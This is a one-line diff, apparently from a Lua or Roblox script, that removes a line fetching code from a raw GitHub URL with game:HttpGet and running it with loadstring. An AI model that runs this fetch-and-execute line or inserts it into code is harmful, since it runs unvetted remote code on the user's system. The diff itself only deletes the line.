@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CodeExperiMental/ASDq234e12edASC2/main/src.lua", true))()
